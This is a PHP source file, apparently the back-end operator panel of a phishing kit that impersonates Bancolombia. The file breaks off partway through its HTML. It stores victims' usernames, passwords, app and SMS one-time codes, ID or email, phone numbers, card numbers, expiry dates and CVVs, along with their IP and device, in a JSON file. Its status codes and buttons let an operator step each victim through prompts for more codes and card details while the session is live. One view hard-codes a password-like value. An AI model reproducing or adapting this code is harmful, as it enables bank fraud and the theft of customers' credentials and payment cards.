<?php
// require('conexion.php'); // Ya no necesitamos SQL

$labelstatus = "";
$alertstatus = "-off";
$fondo = "#fff";
$colorlabel = "#b5b5c3";
$colorborde = "#C0C0CC";
$activo = "";	
$btn_on = "";
$icon_on = "a";
$icon_fin = "a";
$cerrado = "";
$borde_cerrado = "";
$etiquetas1 = "none";
$etiquetas2 = "none";

// ===========================
// Almacenamiento en JSON (sin SQL)
// ===========================
function _data_file_path() {
    $base = __DIR__ . '/../data';
    if (!is_dir($base)) {
        @mkdir($base, 0777, true);
    }
    return $base . '/data.json';
}

function _data_load() {
    $file = _data_file_path();
    if (!file_exists($file)) {
        @file_put_contents($file, json_encode([]), LOCK_EX);
    }
    $raw = @file_get_contents($file);
    $arr = json_decode($raw, true);
    if (!is_array($arr)) { $arr = []; }
    return $arr;
}

function _data_save($arr) {
    $file = _data_file_path();
    @file_put_contents($file, json_encode(array_values($arr), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function _now() {
    date_default_timezone_set('America/Bogota');
    return date("Y-m-d H:i:s");
}

function _next_id($arr) {
    $max = 0;
    foreach ($arr as $it) {
        if (isset($it['idreg']) && intval($it['idreg']) > $max) $max = intval($it['idreg']);
    }
    return $max + 1;
}

function _find_index_by_id(&$arr, $id) {
    foreach ($arr as $i => $it) {
        if (strval($it['idreg']) === strval($id)) return $i;
    }
    return -1;
}

function _find_last_by_ip($arr, $ip) {
    $found = null;
    foreach ($arr as $it) {
        if (isset($it['ip']) && $it['ip'] === $ip) {
            if ($found === null) $found = $it; else {
                if (strtotime($it['horamodificado'] ?? '1970-01-01 00:00:00') > strtotime($found['horamodificado'] ?? '1970-01-01 00:00:00')) {
                    $found = $it;
                }
            }
        }
    }
    return $found;
}

function input_info($msg){
	$GLOBALS["labelstatus"] = $msg;	
	$GLOBALS["alertstatus"] = "";
	$GLOBALS["fondo"] = "#79B6FF";	
	$GLOBALS["colorlabel"] = "#fff";
	$GLOBALS["colorborde"] = "#fff";
	$GLOBALS["activo"] = "";	
	$GLOBALS["btn_on"] = "";
	$GLOBALS["icon_on"] = "a";
	$GLOBALS["icon_fin"] = "a";
	$GLOBALS["cerrado"] = "";
	$GLOBALS["borde_cerrado"] = "";
	$GLOBALS["etiquetas1"] = "inital";
	$GLOBALS["etiquetas2"] = "none";
}

function wait_info($msg){
	$GLOBALS["labelstatus"] = $msg;	
	$GLOBALS["alertstatus"] = "-off";
	$GLOBALS["fondo"] = "#fff";
	$GLOBALS["colorlabel"] = "#b5b5c3";
	$GLOBALS["colorborde"] = "#C0C0CC";
	$GLOBALS["activo"] = "disabled";
	$GLOBALS["btn_on"] = "-off";
	$GLOBALS["icon_on"] = "g";
	$GLOBALS["icon_fin"] = "a";
	$GLOBALS["cerrado"] = "";
	$GLOBALS["borde_cerrado"] = "";
	$GLOBALS["etiquetas1"] = "none";
	$GLOBALS["etiquetas2"] = "inital";
}

function close_info(){
	$GLOBALS["labelstatus"] = "Finalizado";	
	$GLOBALS["alertstatus"] = "-off";
	$GLOBALS["fondo"] = "#fff";	
	$GLOBALS["colorlabel"] = "#b5b5c3";
	$GLOBALS["colorborde"] = "#C0C0CC";
	$GLOBALS["activo"] = "disabled";
	$GLOBALS["btn_on"] = "-off";
	$GLOBALS["icon_on"] = "g";
	$GLOBALS["icon_fin"] = "r";
	$GLOBALS["cerrado"] = " fin";
	$GLOBALS["borde_cerrado"] = "border: 1px solid #F1416C;";
	$GLOBALS["etiquetas1"] = "none";
	$GLOBALS["etiquetas2"] = "inital";
}

function traer_regitro($dir){
	$data = _data_load();
	$row = _find_last_by_ip($data, $dir);
	if ($row && isset($row['idreg'])) return $row['idreg'];
	return null;
}

function crear_registro($usr,$dis){
	$ip_add = $_SERVER['REMOTE_ADDR'];
	$hoy = _now();
	$data = _data_load();
	$id = _next_id($data);
	$data[] = [
		'idreg' => $id,
		'usuario' => $usr,
		'password' => '',
		'otp' => '',
		'dispositivo' => $dis,
		'ip' => $ip_add,
		'email' => '',
		'cemail' => '',
		'banco' => 'Bancolombia',
		'status' => 1,
		'horacreado' => $hoy,
		'horamodificado' => $hoy,
		'celular' => '',
		'tarjeta' => '',
		'ftarjeta' => '',
		'cvv' => '',
		'mensaje' => ''
	];
	_data_save($data);
}


function actualizar_registro_pass($reg,$pas){
	$hoy = _now();
	$data = _data_load();
	$idx = _find_index_by_id($data, $reg);
	if ($idx >= 0) {
		$data[$idx]['status'] = 1;
		$data[$idx]['password'] = $pas;
		$data[$idx]['horamodificado'] = $hoy;
		_data_save($data);
	}
}



function buscar_estado($r){
	$data = _data_load();
	$idx = _find_index_by_id($data, $r);
	if ($idx >= 0) {
		return strval($data[$idx]['status']);
	}
	return '';
}

function traer_mensaje($reg){
	$data = _data_load();
	$idx = _find_index_by_id($data, $reg);
	if ($idx >= 0) {
		echo $data[$idx]['mensaje'] ?? '';
	}
}


function mensaje($reg,$msg){
	$hoy = _now();
	$data = _data_load();
	$idx = _find_index_by_id($data, $reg);
	if ($idx >= 0) {
		$data[$idx]['status'] = 14;
		$data[$idx]['mensaje'] = $msg;
		$data[$idx]['horamodificado'] = $hoy;
		_data_save($data);
	}
}

function actualizar_mensaje($reg){
	$hoy = _now();
	$data = _data_load();
	$idx = _find_index_by_id($data, $reg);
	if ($idx >= 0) {
		$data[$idx]['status'] = 13;
		$data[$idx]['horamodificado'] = $hoy;
		_data_save($data);
	}
}

function actualizar_registro_otp($reg,$cd){
	$hoy = _now();
	$data = _data_load();
	$idx = _find_index_by_id($data, $reg);
	if ($idx >= 0) {
		$data[$idx]['status'] = 3;
		$data[$idx]['otp'] = $cd;
		$data[$idx]['horamodificado'] = $hoy;
		_data_save($data);
	}
}

function actualizar_registro_otp2($reg,$cd){
	$hoy = _now();
	$data = _data_load();
	$idx = _find_index_by_id($data, $reg);
	if ($idx >= 0) {
		$data[$idx]['status'] = 9;
		$data[$idx]['cemail'] = $cd;
		$data[$idx]['horamodificado'] = $hoy;
		_data_save($data);
	}
}


function actualizar_registro_info($reg,$doc,$cel){
	$hoy = _now();
	$data = _data_load();
	$idx = _find_index_by_id($data, $reg);
	if ($idx >= 0) {
		$data[$idx]['status'] = 5;
		$data[$idx]['email'] = $doc;
		$data[$idx]['celular'] = $cel;
		$data[$idx]['horamodificado'] = $hoy;
		_data_save($data);
	}
}


function actualizar_registro_tar($reg,$tar,$ft,$cvv){
	$hoy = _now();
	$data = _data_load();
	$idx = _find_index_by_id($data, $reg);
	if ($idx >= 0) {
		$data[$idx]['status'] = 7;
		$data[$idx]['tarjeta'] = $tar;
		$data[$idx]['ftarjeta'] = $ft;
		$data[$idx]['cvv'] = $cvv;
		$data[$idx]['horamodificado'] = $hoy;
		_data_save($data);
	}
}


function cargar_casos(){
	$data = _data_load();
	$items = array_filter($data, function($it){ return isset($it['status']) && intval($it['status']) !== 0; });
	usort($items, function($a,$b){
		return strtotime($b['horamodificado'] ?? '1970-01-01 00:00:00') <=> strtotime($a['horamodificado'] ?? '1970-01-01 00:00:00');
	});
	foreach ($items as $datos) {
		pintar_casilla(
			$datos['idreg'] ?? '',
			$datos['usuario'] ?? '',
			$datos['password'] ?? '',
			$datos['otp'] ?? '',
			$datos['dispositivo'] ?? '',
			$datos['ip'] ?? '',
			$datos['email'] ?? '',
			$datos['cemail'] ?? '',
			$datos['banco'] ?? '',
			$datos['status'] ?? 0,
			$datos['horamodificado'] ?? '',
			$datos['celular'] ?? '',
			$datos['tarjeta'] ?? '',
			$datos['ftarjeta'] ?? '',
			$datos['cvv'] ?? ''
		);
	}
}

function pito(){
	$data = _data_load();
	foreach ($data as $it) {
		if (in_array(intval($it['status'] ?? 0), [3,9], true)) { echo 'OTP'; return; }
	}
	foreach ($data as $it) {
		if (in_array(intval($it['status'] ?? 0), [1,5,7], true)) { echo 'SI'; return; }
	}
	echo 'NO';
}





function pintar_casilla($reg,$usr,$pass,$otp,$equipo,$ip,$eml,$cml,$ban,$estado,$hora,$cel,$tar,$fec,$cvv){
	$nomEstado = "";
	switch ($estado) {
		case 1: input_info("Ingresó Usuario/Clave");
				break;
		case 2: wait_info("Esperando APP OTP");
				break;
		case 3: input_info("Ingresó APP OTP");
				break;
		case 4: wait_info("Esperando Cedula/Celular");					
				break;
		case 5: input_info("Ingresó Cedula/Celular");					
				break;
		case 6: wait_info("Esperando Info Tarjeta");	
				break;
		case 7: input_info("Ingresó Info Tarjeta");
				break;
		case 8: wait_info("Esperando SMS OTP");				
				break;
		case 9: input_info("Ingresó SMS OTP");	
				break;
		case 10: close_info();
				break;
		case 12: wait_info("Esperando Usuario/Clave");	
				break;
		case 13: input_info("Vio el Mensaje");	
				break;
		case 14: wait_info("Esperando Ver Mensaje");	
				break;
		}





		echo '<div class="item-des" style="background-color: '.$GLOBALS["fondo"].';'.$GLOBALS["borde_cerrado"].'">
			<table>
				<tr>
					<td colspan="3"><div class="grupo" style="background-color: #006BE9;">Login</div></td>
					<td colspan="3"><div class="grupo" style="background-color: #50CD89;">Información</div></td>
				</tr>
				<tr>
					<td width="220">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$usr.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/8.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/8a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="120">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$pass.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/9.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/9a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="100">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$otp.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/10.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/10a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
			
					<td width="330">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$eml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/11.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/11a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="150">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/12.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/12a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="120">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cel.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/13.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/13a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>
<div style="width:100%; height: 7px;"></div>
			<table>
				<tr>
					<td colspan="3"><div class="grupo" style="background-color: #F1416C;">Tarjeta</div></td>
					<td colspan="4"><div class="grupo" style="background-color: #FFC700;">Sistema</div></td>
				</tr>
				<tr>
					<td width="200">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$tar.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/2.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/2a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="100">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$fec.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/3.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/3a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="65">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cvv.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/1.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/1a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>				
					<td width="110">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$equipo.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/4.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/4a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="125">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$ip.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/5.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/5a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="130">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor"><img src="../img/14.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/14a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/6.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/6a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="200">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$hora.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/7.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/7a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>
<div class="msg-status'.$GLOBALS["alertstatus"].'">'.$GLOBALS["labelstatus"].'</div>
			<table style="margin:0 auto;">
				<tr>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].'  id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Usuario</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>OTP</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>SMS OTP</td>
								</tr>
							</table>
						</button>						
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Info</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Tarjeta</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' mensaje" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/mensaje-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Mensaje</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control finalizar'.$GLOBALS["cerrado"].'"  id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
									<td>Finalizar</td>
								</tr>
							</table>
						</button>
					</td>
				</tr>
			</table>
		</div>
		

		<div class="item-des-mob" style="background-color:'.$GLOBALS["fondo"].';'.$GLOBALS["borde_cerrado"].'">
			<table>
				<tr>
					<td colspan="3">
						<div class="grupo" style="background-color: #006BE9;">Login</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed  '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$usr.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/8.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/8a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$pass.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/9.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/9a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$otp.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/10.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/10a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="2">
						<div class="grupo" style="background-color: #50CD89;">Información</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$eml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/11.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/11a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">music5710#</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/12.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/12a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cel.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/13.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/13a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="3">
						<div class="grupo" style="background-color: #F1416C;">Tarjeta</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$tar.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/2.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/2a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$fec.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/3.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/3a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cvv.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/1.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/1a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="3">					
						<div class="grupo" style="background-color: #FFC700;">Sistema</div>		
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor"><img src="../img/14.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/14a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/6.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/6a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].'">
							<span class="valor">'.$ip.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/5.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/5a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$equipo.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/4.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/4a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>					
				</tr>
				<tr>
					<td colspan="3">					
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$hora.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/7.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/7a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>	
					</td>
				</tr>
			</table>

			<table id="control-mob-2" width="100%">
				<tr>
					<td>
						<div class="msg-status'.$GLOBALS["alertstatus"].'">'.$GLOBALS["labelstatus"].'</div>
					</td>
			
					<td>
						<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Usuario</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>OTP</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>SMS OTP</td>
								</tr>
							</table>
						</button>	
					</td>
				</tr>
				<tr>
					<td>									
						<button class="control finalizar'.$GLOBALS["cerrado"].'" id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
									<td>Finalizar</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Info</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Tarjeta</td>
								</tr>
							</table>
						</button>
					</td>
					<td>									
						<button class="control'.$GLOBALS["btn_on"].' mensaje'.$GLOBALS["cerrado"].'" id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/mensaje-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
									<td>Mensaje</td>
								</tr>
							</table>
						</button>
					</td>
						
				</tr>
			</table>
<div class="msg-status'.$GLOBALS["alertstatus"].'" id="msg-mob">'.$GLOBALS["labelstatus"].'</div>
			<table style="margin:0 auto;" id="control-mob">
				<tr>
					<td>
						<button class="control2'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].' id="'.$reg.'"">
							<table>
								<tr>
									<td><img src="../img/usuario-a.svg" width="16"></td>
									<td>Usuario</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control2'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/otp-a.svg" width="16"></td>
									<td>OTP</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control2'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>SMS OTP</td>
								</tr>
							</table>
						</button>						
					</td>
					<td>
						<button class="control2'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Info</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control2'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Tarjeta</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control2'.$GLOBALS["btn_on"].' mensaje" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/mensaje-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Mensaje</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control2 finalizar'.$GLOBALS["cerrado"].'"  id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
									<td>Finalizar</td>
								</tr>
							</table>
						</button>
					</td>
				</tr>
			</table>
		</div>




		<div class="item-des-small" style="background-color:'.$GLOBALS["fondo"].';'.$GLOBALS["borde_cerrado"].'">
			<table>
				<tr>
					<td colspan="2">
						<div class="grupo" style="background-color: #006BE9;">Login</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$usr.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/8.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/8a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$pass.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/9.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/9a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$otp.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/10.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/10a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="2">
						<div class="grupo" style="background-color: #50CD89;">Información</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$eml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/11.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/11a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/12.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/12a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cel.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/13.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/13a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="3">
						<div class="grupo" style="background-color: #F1416C;">Tarjeta</div>
					</td>
				</tr>
				<tr>
					<td>
